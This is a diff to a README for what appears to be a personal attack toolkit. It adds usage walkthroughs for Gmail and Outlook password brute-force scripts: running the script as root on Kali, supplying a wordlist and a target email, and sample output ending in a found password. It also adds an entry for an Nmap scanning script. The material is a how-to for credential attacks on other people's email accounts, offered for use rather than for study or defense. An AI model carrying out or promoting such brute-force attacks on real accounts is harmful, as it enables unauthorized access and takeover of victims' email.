@@ -33,9 +33,14 @@ My Personal Account on Instagram:https://www.instagram.com/yazeed.yazeed.351/
 
 # Example:
 
-1.Enter Email Target: example.gmail.com
+1.python GMAIL_BRUTE_FORCE.py
 
-2.Enter Wordlist File: /root/Desktop/example.txt
+2.   [1] start attack
+     [2] exit
+   root@kali:~/brute_force-more# 1
+   
+   path of wordlist file: /usr/share/wordlists/fasttrack.txt
+   Enter Target Email: example.gmail.com
 
 [!] PASS INCORRECT ======> example
 
@@ -69,7 +74,28 @@ Enter Url or IP: www.example.com
 
 # Example:
 
-1.Enter Email Target: example.example.com
+1.python GMAIL_BRUTE_FORCE.py
+
+2.   [1] start attack
+     [2] exit
+   root@kali:~/brute_force-more# 1
+   
+   path of wordlist file: /usr/share/wordlists/fasttrack.txt
+   Enter Target Email: example.gmail.com
+
+[!] PASS INCORRECT ======> example
+
+[!] PASS INCORRECT ======> example
+
+[!] PASS INCORRECT ======> example
+
+[!] PASS FOUND =======> yazeed1232
+
+# Steps To Use OUTLOOK Brute Force script:
+
+# Example:
+
+1.Enter Email Target: example.outlook.com
 
 2.Enter Wordlist File: /root/Desktop/example.txt
 
@@ -80,3 +106,8 @@ Enter Url or IP: www.example.com
 [!] PASS INCORRECT ======> example
 
 [!] PASS FOUND =======> yazeed1232
+
+# How to Use Nmap Script:
+
+Enter Url or IP: www.example.com
+
